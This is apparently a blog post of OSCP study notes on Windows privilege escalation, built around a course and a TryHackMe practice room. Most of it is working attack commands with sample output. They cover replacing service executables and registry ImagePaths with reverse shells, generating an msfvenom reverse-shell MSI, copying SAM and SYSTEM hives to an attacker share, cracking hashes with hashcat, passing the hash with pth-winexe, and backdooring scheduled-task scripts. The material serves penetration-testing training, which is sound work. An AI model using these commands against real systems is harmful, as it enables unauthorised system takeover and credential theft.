---
title: "Windows Privilege Escalation Techniques"
date: 2022-02-17T14:07:56+02:00
description: "Windows privilege escalation techniques."
featured: true
draft: false
toc: true
# menu: main
usePageBundles: false
#featureImage: "/images/windows_privilege_escalation.png"
#featureImageAlt: 'Description of image'
#featureImageCap: 'This is the featured image.'
thumbnail: "/images/windows_privilege_escalation.png"
shareImage: "/images/windows_privilege_escalation.png"
codeMaxLines: 20
codeLineNumbers: false
figurePositionShow: true
categories:
  - Privilege Escalation
tags:
  - Privilege Escalation
  - Windows
---
This post is based on the notes and cheatsheets I wrote while studying for the Offensive Security Certified Professional (OSCP) exam, and can be used as a brief reference while looking for basic Windows privilege escalation methods. The contents of this blog originate from the “Windows Privilege Escalation for OSCP & Beyond” course created by Tib3rius. The course is available at Udemy and can be found [here](https://www.udemy.com/course/windows-privilege-escalation/). 

Tib3rius also created a free room at TryHackMe that can be leveraged to practice the techniques outlined in his course and this cheatsheet. The TryHackMe room can be found [here](https://tryhackme.com/room/windows10privesc). 

## Useful Enumeration Tools
While manual enumeration should always be conducted, it is useful to utilize some auto enumeration tools to enhance the enumeration process. This section describes some useful enumeration tools and their syntax. My personal favorite privilege escalation tool is WinPEAS, which is part of the Windows Privilege Escalation Awesome Scripts suite available [here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). In order to run scripts, we should always first set the batch script execution policy to bypass, after which we can run the script:

```batch
# set syntax highlighting
PS> reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
PS> batch -exec bypass
PS> .\winPEASany.exe -h

# by default, runs all checks.
PS> .\winPEASany.exe
```

Another useful tool provided by Microsoft is Accesschk.exe, which is part of the Microsoft Sysinternals suite. We should make sure we download an older version of this software, as the newer software doesn't allow the user to accept the EULA via the CLI, and therefore require GUI access. Older versions of Accesschk are found [here](https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%0D) and [here](https://xor.cat/assets/other/Accesschk.zip). Example usage:

```batch
PS> .\accesschk.exe /accepteula -uwcqv user daclsvc
```

Other useful tools and their syntax is found below:

```batch
# PowerUp
PS> .\PowerUp.ps1
PS> Invoke-AllChecks

# SharpUp
PS> .\SharpUp.exe

# Seatbelt
# Seatbelt requires options, we can view the options by running the binary:
PS> .\Seatbelt.exe

# additionally we can run all Seatbelt checks:
PS> .\Seatbelt.exe all
```

## Service Exploits
Specific versions of a service can be vulnerable to a local privilege escalation exploit. To enumerate a server we can leverage sc.exe:

```batch
# get general information of a service
sc.exe qc <name>

# get current status of a service
sc.exe query <name>

# modify a configuration option of a service:
sc.exe config <name> <option>= <value>

# start or stop a service
net start/stop <name>
```

We can lookup the specific service in ExploitDB, on GitHub or Google to find potential exploits. 

## Service Misconfigurations
Misconfigurations of a service can often lead to a privilege escalation vector. Before getting stuck into the service misconfiguration rabbithole, make sure you can start/stop the service. Otherwise the next steps will likely fail (unless we can reboot the server).

### Insecure Service Properties
We can use WinPEAS to enumerate services:

```batch
PS> .\winPEASany.exe quiet servicesinfo

> [+] Interesting Services -non Microsoft-(T1007) 
> daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - > Stopped
> YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
> [+] Modifiable Services(T1007)
> LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
> daclsvc: WriteData/CreateFiles
```

Indicating that we can modify the daclsvc service. We can verify this with accesschk.exe:

```batch
PS> .\accesschk.exe /accepteula -uwcqv user daclsvc

> RW daclsvc
> SERVICE_CHANGE_CONFIG
> SERVICE_START
> SERVICE_STOP
```

Which shows us that our user can start and stop the service. Now that we know we can alter the service, and restart it afterwards, we should query the service to see what user it runs as, and what executable it executes:

```batch
PS> sc qc daclsvc

> SERVICE_NAME: daclsvc
> TYPE : 10 WIN32_OWN_PROCESS
> START_TYPE : 3 DEMAND_START
> ERROR_CONTROL : 1 NORMAL
> BINARY_PATH_NAME : "C:\Program Files\DACL Service\daclservice.exe"
> DEPENDENCIES :
> SERVICE_START_NAME : LocalSystem
```

The service is started as LocalSystem and executes "daclservice.exe", which tells us that if we alter the daclservice.exe file, the contents of the new file will be executed with system privileges. We generate a reverse shell, alter the service configuration and restart the service after which we get a reverse shell running as the system user:

```batch
PS> sc config daclsvc binpath= "\'C:\PrivEsc\reverse.exe\'"
PS> net start daclsvc
```

### Unquoted Service Path
We can run WinPEAS to enumerate services, and look for unquoted service path vulnerabilities:

```batch
PS> .\winPEASany.exe quiet servicesinfo

> unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
```

We check if we can start/stop the service, and see if we can write to any of the directories that are specified in the path:

```batch
# can we restart the service?
PS> .\accesschk.exe /accepteula -ucqv user unquotedsvc
> LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
> unquotedsvc: WriteData/CreateFiles

# can we write to any of the paths?
PS> C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\"
> nope
PS> C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\"
> nope

PS> C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
> RW BUILTIN\Users
> RW NT SERVICE\TrustedInstaller
> RW NT AUTHORITY\SYSTEM
> RW BUILTIN\Administrators
```

We are part of the Builtin Users group, which means we can write to the "Unquoted Path Service" path, and can create a reverse shell named "Common.exe":

```batch
PS> copy reverse.exe "c:\Program Files\Unquoted Path Service\Common.exe"

PS> sc query unquotedsvc
PS> net start unquotedsvc
```

After which we get a reverse shell running as System. 

### Weak Registry Permissions
The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.

We run WinPEAS to enumerate service information, and verify the permissions of the service:

```batch
PS> .\winPEASany.exe quiet servicesinfo
> HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])

# verify the permissions:
PS> C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

> […]
> RW NT AUTHORITY\INTERACTIVE
> KEY_ALL_ACCESS
```

The NT AUTHORITY/INTERACTIVE group has all access. This is a Pseudo group that consists of users that have an interactive sessions, so we belong to this group. We check the registry key permissions and see if we can restart the service:

```batch
PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
> […]
> Access : Everyone Allow ReadKey
> NT AUTHORITY\INTERACTIVE Allow FullControl
> […]

# check if we can start/stop the service:
PS> .\accesschk.exe /accepteula -ucqv user regsvc
> LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
> regsvc: WriteData/CreateFiles
```

We have full controll over the registry key, and are allowed to restart the service. We can change the executable that is ran in order to get a reverse shell:

```batch
PS> reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc
> ImagePath REG_EXPAND_SZ "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
> DisplayName REG_SZ Insecure Registry Service
> ObjectName REG_SZ LocalSystem

PS> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

PS> net start regsvc
```

After which we get a reverse shell running as System. 

### Insecure Service Executables
If we are allowed to alter the service executable, we can upload our own and restart the service to get a shell. We use WinPEAS to enumerate services, check if we can access the service and whether we can restart the service:

```batch
PS> .\winPEASany.exe quiet servicesinfo
> filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
> File Permissions: Everyone [AllAccess]

# check for write access
PS> C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
> RW Everyone
> FILE_ALL_ACCESS

# check whether we can restart the service
PS> .\accesschk.exe /accepteula -ucqv user filepermsvc
> LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
> filepermsvc: WriteData/CreateFiles
```

All prerequisites seem to be met. We can now create a backup of the original executable, generate a reverse shell with the same name as the executable and restart the service:

```batch
# create backup
PS> copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp

# overwrite original service executable
PS> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

# restart service
PS> net start filepermsvc
```

After which we get a reverse shell running as System. 

## Registry
Insecure registry configurations can lead to several privilege escalation vectors. Two examples include the following:

### Autoruns
We run WinPEAS.exe to get application info:

```batch
PS> .\winPEASany.exe quiet applicationsinfo
> [+] Autorun Applications(T1010)
> Folder: C:\Program Files\Autorun Program
> File: C:\Program Files\Autorun Program\program.exe
> FilePerms: Everyone [AllAccess]
> RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Which shows that there is an autorun application to which everyone has access. We can exploit this missconfiguration by overwriting program.exe with a reverse shell and restarting the sytem:

```batch
# create backup
PS> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp

# overwrite original executable
PS> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"

# restart the system
PS> shutdown /r /t 0
```

After which we get a reverse shell running as System. 

### AlwaysInstallElevated
MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.

The catch is that two Registry settings must be enabled for this to work. The “AlwaysInstallElevated” value must be set to 1 for both the local machine: 

```batch
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

If either of these are missing or disabled, the exploit will not work. 

We run WinPEAS.exe to enumerate windowscreds:

```batch
PS> .\winPEASany.exe quiet windowscreds
> AlwaysInstallElevated set to 1 in HKLM
> AlwaysInstallElevated set to 1 in HKCU
```

We can manually check whether the AlwaysInstallElevated is set to 1 in HKLM and HKCU:
```batch
PS> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
> AlwaysInstallElevated REG_DWORD 0x1

PS> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
> AlwaysInstallElevated REG_DWORD 0x1
```

We can now generate an msi revere shell:

```bash
sh> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f msi -o reverse.msi
```

And execute it:

```batch
PS> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

After which we get a reverse shell running as System. 

## Passwords
We can run WinPEAS.exe to enumerate any set passwords, or manually query for passwords:

```batch
PS> .\winPEASany.exe quiet filesinfo userinfo

# manually
PS> reg query HKLM /f password /t REG_SZ /s
PS> reg query HKCU /f password /t REG_SZ /s
```

If any credentials are stored and found, we can use winexe to login as either admin or system:

```bash
# admin
sh> winexe -U 'admin%password' //10.10.252.99 cmd.exe

# system
sh> winexe -U 'admin%password' --system //10.10.252.99 cmd.exe
```

If credentials are saved onto the system, we can use WinPEAS.exe to retrieve them, or find them ourselves manually:

```batch
PS> .\winPEASany.exe quiet cmd windowscreds

PS> cmdkey /list

> Target: Domain:interactive=WIN-QBA94KB3IOF\admin
> Type: Domain Password
> User: WIN-QBA94KB3IOF\admin
```

We can then use RunAs to use the saved creds and run as that user:

```batch
PS> runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

After which we get a reverse shell as an administrator.

### Security Account Manager (SAM)
Windows uses the security account manager (SAM) database to store user passwords. If we can download the SAM, we can try to crack the corresponding hashes. The files and their corresponding backups can be found in the following locations:

```batch
# original files:
"C:\Windows\System32\config"

# backups
"C:\Windows\Repair"
"C:\Windows\System32\config\RegBack"
```

If we find a backup of these files we can copy them over to our attacker system:

```batch
PS> copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
PS> copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```

And use Python3 creddump7/pwdump.py to dump the hashes, after which we can use hashcat to try and crack the hash:

```bash
sh> python3 creddump7/pwdump.py SYSTEM SAM
> admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::

sh> hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
```

If we crack the hash we can use it to login. 

### Passing the Hash
If we can't crack the hash, we can try to pass the hash. We can use the hash and run the following commands:

```bash
# administrator shell
sh> pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<ip> cmd.exe

# system shell
sh> pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<ip> cmd.exe
```

After which we get a shell as system / administrator.

## Scheduled Tasks
Insecure scheduled tasks can often be used for privilege escalation. We can enumerate any scheduled tasks:

```batch
CMD> schtasks /query /fo LIST /v

PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

As an example, we find a cleanup.ps1 script to which we can write data and upload a reverse shell:

```batch
# check if we can write to the file
PS> C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

# create backup and alter the file to execute our reverse shell
PS> copy C:\DevTools\CleanUp.ps1 C:\Temp\
PS> echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

After which we get a reverse shell when it is executed. 

## Insecure GUI Apps
If we have access to a remote desktop session and find an interesting program that runs as administrator, we can possibly leverage it to spawn a shell as admin. Example:

```batch
PS> tasklist /V | findstr mspaint
```

We find paint running as administrator. We escalate privileges using the following steps:
- In Paint, click "File" and then "Open". 
- In the open file dialog box, click in the navigation input and paste: 
	- file://c:/windows/system32/cmd.exe

## Startup Apps
If we can write to the start up directory we can execute a reverse shell when an admin logs in. To check this:

```batch
PS> C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

PS> cscript C:\PrivEsc\CreateShortcut.vbs
```
  
When an admin logs in, we have an admin shell.

## Installed Apps
Enumerate the system for running apps that are potentially vulnerable:

```batch
PS> tasklist /V

PS> .\seatbelt.exe NonstandardProcesses

PS> .\winPEASany.exe quiet procesinfo
```

And search ExploitDB and GitHub for possible privilege escalation exploits. 

## Token Impersonation
Check for token impersonation permissions:
- SeImpersonatePrivileges
- SeAssignPrimaryTokenPrivilege

If these are enabled, we can possibly run one of the following exploits to escalate privileges:
- Hot Potato (oldest)
- JuicyPotato (younger)
- RoguePotato (even younger but requires port forwarding)
- PrintSpoofer (newest and most reliable)

## User-Privileges-based Privilege Escalation
Check what privileges your user has by running the following command:

```batch
PS> whoami /priv
```

The following privileges can be used for privilege escalation:
- SeBackupPrivilege
	- Grants read access to all objects on the system, regardless of their ACL --> extract hashes and crack them or perform pass-the-hash attack!
- SeRestorePrivilege
	- Grants write access to all objects on the system, regardless of their ACL --> modify service binaries, overwrite DLL used by a system process or modify registry settings.
- SeTakeOwnershipPrivilege
	- Lets the user take ownership over an object (the WRITE_OWNER permission). Once you own an object, you can modify it's ACL and grant yourself write access. We can then use the same privesc as with the SeRestorePrivilege

If either of these four privileges are enabled:
-   SeTcbPrivilege;
-   SeCreateTokenPrivilege;
-   SeLoadDriverPrivilege;
-   SeDebugPrivilege.

Google for possible privilege escalation routes!

## Metasploit
If all else fails, we can attempt to use Metasploit's local exploit suggester module. Information on how to use this module can be found [here](https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/). Make sure you are running in an x64-bit process if the system is x64. Migrate if necessary. 

## Kernel Exploits
If even Metasploit fails we can look into kernel exploits. We first need to get the information of the system we are currently running on:

```batch
PS> systeminfo > \\10.10.10.10\tools\systeminfo.txt
```

We can then use Windows Exploit Suggester (WES) to identify possible kernel exploits:

```bash
sh> python wes.py /tools/systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more
```

We can then look for pre-compiled kernel exploits [here](https://github.com/SecWiki/windows-kernel-exploits), or look for them on GitHub / Google.